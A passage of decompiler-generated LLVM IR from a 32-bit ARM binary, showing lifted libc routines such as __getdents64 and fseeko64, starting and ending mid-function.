  %v5_17c28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c28, i32* %v4_17c28, align 4
  %v0_17c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c2c = add i32 %v0_17c2c, 40
  %v1_17c30 = inttoptr i32 %v1_17c2c to i32*
  %v2_17c30 = load i32, i32* %v1_17c30, align 4
  %v3_17c30 = add i32 %v0_17c2c, 44
  %v4_17c30 = inttoptr i32 %v3_17c30 to i32*
  %v5_17c30 = load i32, i32* %v4_17c30, align 4
  store i32 %v5_17c30, i32* %r1.global-to-local, align 4
  %v0_17c34 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c34 = add i32 %v0_17c34, 64
  %v1_17c38 = inttoptr i32 %v1_17c34 to i32*
  store i32 %v2_17c30, i32* %v1_17c38, align 4
  %v3_17c38 = add i32 %v0_17c34, 68
  %v4_17c38 = inttoptr i32 %v3_17c38 to i32*
  %v5_17c38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c38, i32* %v4_17c38, align 4
  %v0_17c3c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c3c = add i32 %v0_17c3c, 48
  %v1_17c40 = inttoptr i32 %v1_17c3c to i32*
  %v2_17c40 = load i32, i32* %v1_17c40, align 4
  %v3_17c40 = add i32 %v0_17c3c, 52
  %v4_17c40 = inttoptr i32 %v3_17c40 to i32*
  %v5_17c40 = load i32, i32* %v4_17c40, align 4
  store i32 %v5_17c40, i32* %r1.global-to-local, align 4
  %v1_17c44 = add i32 %v0_17c3c, 8
  %v2_17c44 = inttoptr i32 %v1_17c44 to i16*
  %v3_17c44 = load i16, i16* %v2_17c44, align 2
  %v4_17c44 = zext i16 %v3_17c44 to i32
  store i32 %v4_17c44, i32* %r2.global-to-local, align 4
  %v1_17c48 = add i32 %v0_17c3c, 10
  %v2_17c48 = inttoptr i32 %v1_17c48 to i16*
  %v3_17c48 = load i16, i16* %v2_17c48, align 2
  %v4_17c48 = zext i16 %v3_17c48 to i32
  store i32 %v4_17c48, i32* %ip.global-to-local, align 4
  %v1_17c4c = add i32 %v0_17c3c, 12
  %v2_17c4c = inttoptr i32 %v1_17c4c to i16*
  %v3_17c4c = load i16, i16* %v2_17c4c, align 2
  %v4_17c4c = zext i16 %v3_17c4c to i32
  store i32 %v4_17c4c, i32* %lr.global-to-local, align 4
  %v1_17c50 = add i32 %v0_17c3c, 14
  %v2_17c50 = inttoptr i32 %v1_17c50 to i16*
  %v3_17c50 = load i16, i16* %v2_17c50, align 2
  %v4_17c50 = zext i16 %v3_17c50 to i32
  store i32 %v4_17c50, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_17c5c = load i32, i32* %r5.global-to-local, align 4
  %v1_17c5c = add i32 %v0_17c5c, 72
  %v1_17c60 = inttoptr i32 %v1_17c5c to i32*
  store i32 %v2_17c40, i32* %v1_17c60, align 4
  %v3_17c60 = add i32 %v0_17c5c, 76
  %v4_17c60 = inttoptr i32 %v3_17c60 to i32*
  %v5_17c60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c60, i32* %v4_17c60, align 4
  %v0_17c64 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c64 = inttoptr i32 %v0_17c64 to i32*
  %v2_17c64 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_17c64, i32* %v1_17c64, align 4
  %v3_17c64 = add i32 %v0_17c64, 4
  %v4_17c64 = inttoptr i32 %v3_17c64 to i32*
  %v5_17c64 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_17c64, i32* %v4_17c64, align 4
  %v0_17c68 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c68 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c68 = add i32 %v1_17c68, 32
  %v3_17c68 = inttoptr i32 %v2_17c68 to i32*
  store i32 %v0_17c68, i32* %v3_17c68, align 4
  %v0_17c6c = load i32, i32* %r7.global-to-local, align 4
  %v1_17c6c = load i32, i32* %r5.global-to-local, align 4
  %v2_17c6c = add i32 %v1_17c6c, 36
  %v3_17c6c = inttoptr i32 %v2_17c6c to i32*
  store i32 %v0_17c6c, i32* %v3_17c6c, align 4
  %v0_17c70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c70 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c70 = add i32 %v1_17c70, 16
  %v3_17c70 = inttoptr i32 %v2_17c70 to i32*
  store i32 %v0_17c70, i32* %v3_17c70, align 4
  %v0_17c74 = load i32, i32* %ip.global-to-local, align 4
  %v1_17c74 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c74 = add i32 %v1_17c74, 20
  %v3_17c74 = inttoptr i32 %v2_17c74 to i32*
  store i32 %v0_17c74, i32* %v3_17c74, align 4
  %v0_17c78 = load i32, i32* %lr.global-to-local, align 4
  %v1_17c78 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c78 = add i32 %v1_17c78, 24
  %v3_17c78 = inttoptr i32 %v2_17c78 to i32*
  store i32 %v0_17c78, i32* %v3_17c78, align 4
  %v0_17c7c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c7c = load i32, i32* %r5.global-to-local, align 4
  %v2_17c7c = add i32 %v1_17c7c, 28
  %v3_17c7c = inttoptr i32 %v2_17c7c to i32*
  store i32 %v0_17c7c, i32* %v3_17c7c, align 4
  ret i32 %v2_17c40

; uselistorder directives
  uselistorder i32 %v0_17c3c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 72, { 11, 5, 6, 7, 8, 1, 12, 0, 2, 3, 4, 9, 10 }
  uselistorder i32 68, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17c90 = load i32, i32* @r4, align 4
  %v6_17c90 = load i32, i32* @r5, align 4
  %v12_17c90 = load i32, i32* @r7, align 4
  %v1_17c94 = add i32 %arg3, 14
  %v2_17c9c = ptrtoint i32* %stack_var_-72 to i32
  %v1_17ca0 = and i32 %v1_17c94, -8
  %v2_17ca4 = sub i32 %v2_17c9c, %v1_17ca0
  %v1_17ca8 = add i32 %v2_17ca4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_17ca8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_17ce4, label %dec_label_pc_17cd0

dec_label_pc_17cd0:                               ; preds = %entry
  %v0_17cd0 = call i32 @__GI___errno_location()
  %v0_17cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17cd4 = sub i32 0, %v0_17cd4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17cdc = inttoptr i32 %v0_17cd0 to i32*
  store i32 %v1_17cd4, i32* %v2_17cdc, align 4
  %v0_17cec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cec

dec_label_pc_17ce4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17cec, label %dec_label_pc_17cf4

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17ce4, %dec_label_pc_17cd0
  %v0_17cec = phi i32 [ -1, %dec_label_pc_17ce4 ], [ %v0_17cec.pre, %dec_label_pc_17cd0 ]
  store i32 %v0_17cec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17dc0

dec_label_pc_17cf4:                               ; preds = %dec_label_pc_17ce4
  %v2_17cf4 = add i32 %v1_17ca8, %arg1
  %v2_17cf8 = add i32 %tmp, %arg3
  store i32 %v2_17cf8, i32* @ip, align 4
  store i32 %v1_17ca8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17da8
  %v1_17d14 = add i32 %v0_17d68, 16
  %v2_17d14 = inttoptr i32 %v1_17d14 to i16*
  %v3_17d14 = load i16, i16* %v2_17d14, align 2
  %v4_17d14 = zext i16 %v3_17d14 to i32
  %v1_17d18 = add nuw nsw i32 %v4_17d14, 7
  %v1_17d1c = and i32 %v1_17d18, 131064
  store i32 %v1_17d1c, i32* %r2.global-to-local, align 4
  %v2_17d24 = add i32 %v1_17d1c, %v0_17d70
  store i32 %v2_17d24, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_17d24, %v2_17cf8
  br i1 %tmp26, label %dec_label_pc_17d30, label %dec_label_pc_17d64

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d14
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17d38 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17d38, i32* %r2.global-to-local, align 4
  %v0_17d3c = load i32, i32* %sl.global-to-local, align 4
  %v1_17d40 = load i32, i32* @sp, align 4
  %v2_17d40 = inttoptr i32 %v1_17d40 to i32*
  store i32 0, i32* %v2_17d40, align 4
  %v4_17d44 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17d38, i32 %v0_17d3c)
  %v0_17d48 = load i32, i32* @r5, align 4
  %v1_17d48 = load i32, i32* %r6.global-to-local, align 4
  %v9_17d48 = icmp eq i32 %v0_17d48, %v1_17d48
  br i1 %v9_17d48, label %dec_label_pc_17d50, label %dec_label_pc_17dbc

dec_label_pc_17d50:                               ; preds = %dec_label_pc_17d30
  %v0_17d50 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_17d5c = inttoptr i32 %v0_17d50 to i32*
  store i32 22, i32* %v2_17d5c, align 4
  %v0_17dc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17dc0

dec_label_pc_17d64:                               ; preds = %dec_label_pc_17d14
  %v1_17d64 = inttoptr i32 %v0_17d68 to i32*
  %v2_17d64 = load i32, i32* %v1_17d64, align 4
  %v3_17d64 = add i32 %v0_17d68, 4
  %v4_17d64 = inttoptr i32 %v3_17d64 to i32*
  %v5_17d64 = load i32, i32* %v4_17d64, align 4
  store i32 %v5_17d64, i32* %r4.global-to-local, align 4
  %v1_17d68 = add i32 %v0_17d68, 8
  store i32 %v1_17d68, i32* %sb.global-to-local, align 4
  %v1_17d6c = inttoptr i32 %v1_17d68 to i32*
  %v2_17d6c = load i32, i32* %v1_17d6c, align 4
  store i32 %v2_17d6c, i32* %sb.global-to-local, align 4
  %v3_17d6c = add i32 %v0_17d68, 12
  %v4_17d6c = inttoptr i32 %v3_17d6c to i32*
  %v5_17d6c = load i32, i32* %v4_17d6c, align 4
  store i32 %v5_17d6c, i32* %sl.global-to-local, align 4
  %v1_17d70 = inttoptr i32 %v0_17d70 to i32*
  store i32 %v2_17d64, i32* %v1_17d70, align 4
  %v3_17d70 = add i32 %v0_17d70, 4
  %v4_17d70 = inttoptr i32 %v3_17d70 to i32*
  %v5_17d70 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17d70, i32* %v4_17d70, align 4
  %v0_17d74 = load i32, i32* @r7, align 4
  %v1_17d74 = add i32 %v0_17d74, 8
  %v1_17d78 = inttoptr i32 %v1_17d74 to i32*
  %v2_17d78 = load i32, i32* %v1_17d78, align 4
  %v3_17d78 = add i32 %v0_17d74, 12
  %v4_17d78 = inttoptr i32 %v3_17d78 to i32*
  %v5_17d78 = load i32, i32* %v4_17d78, align 4
  store i32 %v5_17d78, i32* @r4, align 4
  %v1_17d7c = load i32, i32* @r5, align 4
  %v2_17d7c = add i32 %v1_17d7c, 8
  %v3_17d7c = inttoptr i32 %v2_17d7c to i32*
  store i32 %v2_17d78, i32* %v3_17d7c, align 4
  %v0_17d80 = load i32, i32* @r4, align 4
  %v1_17d80 = load i32, i32* @r5, align 4
  %v2_17d80 = add i32 %v1_17d80, 12
  %v3_17d80 = inttoptr i32 %v2_17d80 to i32*
  store i32 %v0_17d80, i32* %v3_17d80, align 4
  %v0_17d84 = load i32, i32* %r2.global-to-local, align 4
  %v1_17d84 = trunc i32 %v0_17d84 to i16
  %v2_17d84 = load i32, i32* @r5, align 4
  %v3_17d84 = add i32 %v2_17d84, 16
  %v4_17d84 = inttoptr i32 %v3_17d84 to i16*
  store i16 %v1_17d84, i16* %v4_17d84, align 2
  %v0_17d88 = load i32, i32* @r7, align 4
  %v1_17d88 = add i32 %v0_17d88, 18
  %v2_17d88 = inttoptr i32 %v1_17d88 to i8*
  %v3_17d88 = load i8, i8* %v2_17d88, align 1
  %v4_17d88 = zext i8 %v3_17d88 to i32
  store i32 %v4_17d88, i32* @r3, align 4
  %v2_17d8c = load i32, i32* @r5, align 4
  %v3_17d8c = add i32 %v2_17d8c, 18
  %v4_17d8c = inttoptr i32 %v3_17d8c to i8*
  store i8 %v3_17d88, i8* %v4_17d8c, align 1
  %v0_17d90 = load i32, i32* @r7, align 4
  %v1_17d90 = add i32 %v0_17d90, 16
  %v2_17d90 = inttoptr i32 %v1_17d90 to i16*
  %v3_17d90 = load i16, i16* %v2_17d90, align 2
  %v4_17d90 = zext i16 %v3_17d90 to i32
  %v1_17d94 = add nsw i32 %v4_17d90, -19
  store i32 %v1_17d94, i32* @r2, align 4
  %v0_17d98 = call i32 @memcpy()
  %v0_17d9c = load i32, i32* @r7, align 4
  %v1_17d9c = add i32 %v0_17d9c, 16
  %v2_17d9c = inttoptr i32 %v1_17d9c to i16*
  %v3_17d9c = load i16, i16* %v2_17d9c, align 2
  %v4_17d9c = zext i16 %v3_17d9c to i32
  %v0_17da0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17da0, i32* @r5, align 4
  %v2_17da4 = add i32 %v4_17d9c, %v0_17d9c
  store i32 %v2_17da4, i32* @r7, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17da8:                               ; preds = %dec_label_pc_17cf4, %dec_label_pc_17d64
  %v0_17d70 = phi i32 [ %tmp, %dec_label_pc_17cf4 ], [ %v0_17da0, %dec_label_pc_17d64 ]
  %v0_17d68 = phi i32 [ %v1_17ca8, %dec_label_pc_17cf4 ], [ %v2_17da4, %dec_label_pc_17d64 ]
  %v3_17dac = icmp ult i32 %v0_17d68, %v2_17cf4
  %v1_17db0 = add i32 %v0_17d70, 19
  store i32 %v1_17db0, i32* @r0, align 4
  %v1_17db4 = add i32 %v0_17d68, 19
  store i32 %v1_17db4, i32* @r1, align 4
  br i1 %v3_17dac, label %dec_label_pc_17d14, label %dec_label_pc_17dbc.loopexit

dec_label_pc_17dbc.loopexit:                      ; preds = %dec_label_pc_17da8
  %v0_17dbc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17dbc

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17dbc.loopexit, %dec_label_pc_17d30
  %v1_17dbc = phi i32 [ %v0_17d70, %dec_label_pc_17dbc.loopexit ], [ %v0_17d48, %dec_label_pc_17d30 ]
  %v0_17dbc = phi i32 [ %v0_17dbc.pre, %dec_label_pc_17dbc.loopexit ], [ %v1_17d48, %dec_label_pc_17d30 ]
  %v2_17dbc = sub i32 %v1_17dbc, %v0_17dbc
  store i32 %v2_17dbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17dc0

dec_label_pc_17dc0:                               ; preds = %dec_label_pc_17d50, %dec_label_pc_17cec, %dec_label_pc_17dbc
  %v0_17dc0 = phi i32 [ %v0_17dc0.pre, %dec_label_pc_17d50 ], [ %v0_17cec, %dec_label_pc_17cec ], [ %v2_17dbc, %dec_label_pc_17dbc ]
  store i32 %v3_17c90, i32* %r4.global-to-local, align 4
  store i32 %v6_17c90, i32* @r5, align 4
  store i32 %v12_17c90, i32* @r7, align 4
  ret i32 %v0_17dc0

; uselistorder directives
  uselistorder i32 %v0_17d68, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17d70, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17ca8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 8, 17, 19, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 10, 5, 8, 6, 1, 2, 3, 7, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17dc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17da8, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_17ddc = load i32, i32* @r1, align 4
  store i32 %v0_17ddc, i32* @r2, align 4
  %v0_17de4 = call i32 @__GI_fseeko64()
  ret i32 %v0_17de4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_17df4 = load i32, i32* @r4, align 4
  %v6_17df4 = load i32, i32* @r5, align 4
  %v12_17df4 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_17e08 = load i32, i32* @r2, align 4
  store i32 %v0_17e08, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r6.global-to-local, align 4
  %v0_17e14 = load i32, i32* @r0, align 4
  store i32 %v0_17e14, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_17e30, label %dec_label_pc_17e1c

dec_label_pc_17e1c:                               ; preds = %entry
  %v0_17e1c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17e28 = inttoptr i32 %v0_17e1c to i32*
  store i32 22, i32* %v2_17e28, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17e30:                               ; preds = %entry
  %v1_17e30 = add i32 %v0_17e14, 52
  %v2_17e30 = inttoptr i32 %v1_17e30 to i32*
  %v3_17e30 = load i32, i32* %v2_17e30, align 4
  %v1_17e34 = sub i32 1, %v3_17e30
  store i32 %v1_17e34, i32* %r8.global-to-local, align 4
  %v2_17e34 = icmp ult i32 %v3_17e30, 2
  br i1 %v2_17e34, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_17e30
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17e7c

bb:                                               ; preds = %dec_label_pc_17e30
  %v2_17e3c = icmp eq i32 %v1_17e34, 0
  br i1 %v2_17e3c, label %dec_label_pc_17e7c, label %dec_label_pc_17e44

dec_label_pc_17e44:                               ; preds = %bb
  %v1_17e48 = add i32 %v0_17e14, 56
  store i32 %v1_17e48, i32* @r4, align 4
  %v4_17e4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 36) to i32*), align 4
  store i32 %v4_17e4c, i32* %r1.global-to-local, align 4
  store i32 %v1_17e48, i32* %r2.global-to-local, align 4
  %v4_17e5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17e5c)
  %v0_17e70 = load i32, i32* %r6.global-to-local, align 4
  %v2_17e70 = add i32 %v0_17e70, 16
  %v3_17e70 = inttoptr i32 %v2_17e70 to i32*
  %v4_17e70 = load i32, i32* %v3_17e70, align 4
  store i32 %v4_17e70, i32* @ip, align 4
  store i32 97916, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17e70)
  %v0_17e7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17e7c

dec_label_pc_17e7c:                               ; preds = %.thread, %bb, %dec_label_pc_17e44
  %v0_17e88 = phi i32 [ %v0_17e14, %.thread ], [ %v0_17e14, %bb ], [ %v0_17e7c.pre, %dec_label_pc_17e44 ]
  %v1_17e7c = inttoptr i32 %v0_17e88 to i16*
  %v2_17e7c = load i16, i16* %v1_17e7c, align 2
  %v1_17e80 = and i16 %v2_17e7c, 64
  %v2_17e80 = icmp eq i16 %v1_17e80, 0
  br i1 %v2_17e80, label %dec_label_pc_17e98, label %dec_label_pc_17e88

dec_label_pc_17e88:                               ; preds = %dec_label_pc_17e7c
  store i32 %v0_17e88, i32* @r0, align 4
  %v0_17e8c = call i32 @__stdio_wcommit()
  %v2_17e90 = icmp eq i32 %v0_17e8c, 0
  br i1 %v2_17e90, label %dec_label_pc_17e98, label %dec_label_pc_17f00

dec_label_pc_17e98:                               ; preds = %dec_label_pc_17e88, %dec_label_pc_17e7c
  %v0_17e98 = load i32, i32* @r7, align 4
  %v7_17e98 = icmp eq i32 %v0_17e98, 1
  br i1 %v7_17e98, label %dec_label_pc_17ea0, label %dec_label_pc_17e98.dec_label_pc_17eb4_crit_edge

dec_label_pc_17e98.dec_label_pc_17eb4_crit_edge:  ; preds = %dec_label_pc_17e98
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_17eb4

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e98
  %v0_17ea0 = load i32, i32* @r5, align 4
  %v2_17ea4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_17ea4, i32* %r1.global-to-local, align 4
  %v2_17ea8 = inttoptr i32 %v0_17ea0 to i16*
  %v3_17ea8 = call i32 @__stdio_adjust_position(i16* %v2_17ea8, i32 %v2_17ea4)
  %v1_17eac = icmp slt i32 %v3_17ea8, 0
  br i1 %v1_17eac, label %dec_label_pc_17f00, label %dec_label_pc_17ea0.dec_label_pc_17eb4_crit_edge

dec_label_pc_17ea0.dec_label_pc_17eb4_crit_edge:  ; preds = %dec_label_pc_17ea0
  %v0_17eb4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17eb4

dec_label_pc_17eb4:                               ; preds = %dec_label_pc_17e98.dec_label_pc_17eb4_crit_edge, %dec_label_pc_17ea0.dec_label_pc_17eb4_crit_edge
  %v2_17ebc.pre-phi = phi i32 [ %.pre, %dec_label_pc_17e98.dec_label_pc_17eb4_crit_edge ], [ %v2_17ea4, %dec_label_pc_17ea0.dec_label_pc_17eb4_crit_edge ]
  %v0_17eb4 = phi i32 [ %v0_17e98, %dec_label_pc_17e98.dec_label_pc_17eb4_crit_edge ], [ %v0_17eb4.pre, %dec_label_pc_17ea0.dec_label_pc_17eb4_crit_edge ]
  store i32 %v0_17eb4, i32* %r2.global-to-local, align 4
  %v0_17eb8 = load i32, i32* @r5, align 4
  store i32 %v2_17ebc.pre-phi, i32* %r1.global-to-local, align 4
  %v4_17ec0 = call i32 @__stdio_seek(i32 %v0_17eb8, i32* nonnull %stack_var_-32, i32 %v0_17eb4)
  %v1_17ec4 = icmp slt i32 %v4_17ec0, 0
  br i1 %v1_17ec4, label %dec_label_pc_17f00, label %dec_label_pc_17ecc

dec_label_pc_17ecc:                               ; preds = %dec_label_pc_17eb4
  %v0_17ecc = load i32, i32* @r5, align 4
  %v1_17ecc = inttoptr i32 %v0_17ecc to i16*
  %v2_17ecc = load i16, i16* %v1_17ecc, align 2
  %v1_17ed0 = add i32 %v0_17ecc, 8
  %v2_17ed0 = inttoptr i32 %v1_17ed0 to i32*
  %v3_17ed0 = load i32, i32* %v2_17ed0, align 4
  store i32 %v3_17ed0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_17ed8 = and i16 %v2_17ecc, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_17ed8, i16* %v1_17ecc, align 2
  %v0_17ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ee4 = load i32, i32* @r5, align 4
  %v2_17ee4 = add i32 %v1_17ee4, 28
  %v3_17ee4 = inttoptr i32 %v2_17ee4 to i32*
  store i32 %v0_17ee4, i32* %v3_17ee4, align 4
  %v0_17ee8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ee8 = trunc i32 %v0_17ee8 to i8
  %v2_17ee8 = load i32, i32* @r5, align 4
  %v3_17ee8 = add i32 %v2_17ee8, 2
  %v4_17ee8 = inttoptr i32 %v3_17ee8 to i8*
  store i8 %v1_17ee8, i8* %v4_17ee8, align 1
  %v0_17eec = load i32, i32* %r2.global-to-local, align 4
  %v1_17eec = load i32, i32* @r5, align 4
  %v2_17eec = add i32 %v1_17eec, 16
  %v3_17eec = inttoptr i32 %v2_17eec to i32*
  store i32 %v0_17eec, i32* %v3_17eec, align 4
  %v0_17ef0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ef0 = load i32, i32* @r5, align 4
  %v2_17ef0 = add i32 %v1_17ef0, 20
  %v3_17ef0 = inttoptr i32 %v2_17ef0 to i32*
  store i32 %v0_17ef0, i32* %v3_17ef0, align 4
  %v0_17ef4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ef4 = load i32, i32* @r5, align 4
  %v2_17ef4 = add i32 %v1_17ef4, 24
  %v3_17ef4 = inttoptr i32 %v2_17ef4 to i32*
  store i32 %v0_17ef4, i32* %v3_17ef4, align 4
  %v0_17ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ef8 = load i32, i32* @r5, align 4
  %v2_17ef8 = add i32 %v1_17ef8, 44
  %v3_17ef8 = inttoptr i32 %v2_17ef8 to i32*
  store i32 %v0_17ef8, i32* %v3_17ef8, align 4
  br label %dec_label_pc_17f04

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17e88, %dec_label_pc_17eb4, %dec_label_pc_17ea0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ecc, %dec_label_pc_17f00
  %v0_17f04 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f04 = icmp eq i32 %v0_17f04, 0
  br i1 %v2_17f04, label %dec_label_pc_17f04..thread8_crit_edge, label %bb20

dec_label_pc_17f04..thread8_crit_edge:            ; preds = %dec_label_pc_17f04
  %v0_17f1c.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_17f04
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17f14 = load i32, i32* %r6.global-to-local, align 4
  %v3_17f14 = add i32 %v1_17f14, 24
  %v4_17f14 = inttoptr i32 %v3_17f14 to i32*
  %v5_17f14 = load i32, i32* %v4_17f14, align 4
  store i32 %v5_17f14, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17f04..thread8_crit_edge, %bb20
  %v0_17f1c = phi i32 [ %v0_17f1c.pre, %dec_label_pc_17f04..thread8_crit_edge ], [ %v5_17f14, %bb20 ]
  %v2_17f1c = xor i1 %v2_17f04, true
  call void @__pseudo_cond_branch(i1 %v2_17f1c, i32 %v0_17f1c)
  br label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17e1c, %.thread8
  %v0_17f20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17df4, i32* @r4, align 4
  store i32 %v6_17df4, i32* @r5, align 4
  store i32 %v12_17df4, i32* @r7, align 4
  ret i32 %v0_17f20

; uselistorder directives
  uselistorder i32 %v0_17eb4, { 1, 0 }
  uselistorder i32 %v3_17e30, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 56, { 12, 14, 5, 6, 7, 8, 13, 4, 1, 0, 3, 15, 10, 16, 11, 9, 2, 17 }
  uselistorder label %dec_label_pc_17f20, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17f04, { 1, 0 }
  uselistorder label %dec_label_pc_17f00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17eb4, { 1, 0 }
  uselistorder label %dec_label_pc_17e7c, { 2, 1, 0 }
}

define i32 @function_17f34(i32 %arg1) local_unnamed_addr {
dec_label_pc_17f34:
  %v0_17f34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17f34, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17f34
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17f34, %bb
  %v10_17f40 = phi i32 [ %arg1, %dec_label_pc_17f34 ], [ 0, %bb ]
  ret i32 %v10_17f40

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
